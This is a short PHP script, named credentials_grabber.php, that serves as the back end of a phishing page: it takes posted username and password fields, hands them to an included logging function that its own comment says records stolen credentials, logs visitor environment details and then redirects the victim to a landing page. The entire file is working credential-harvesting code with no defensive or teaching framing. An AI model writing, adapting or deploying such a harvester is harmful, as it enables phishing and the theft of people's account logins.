<?php
/**
 * credentials_grabber.php
 * 
 * Logs stolen credentials to credentials.log, then redirects.
 */

require_once __DIR__ . '/logger.php';

// Log environment info
logEnvironment();

if (isset($_POST['uname']) && isset($_POST['psw'])) {
    $uname = trim($_POST['uname']);
    $psw   = trim($_POST['psw']);
    logCredentials($uname, $psw);
}

// Redirect to landing or a "Loading" page
header('Location: landing.php');
exit;
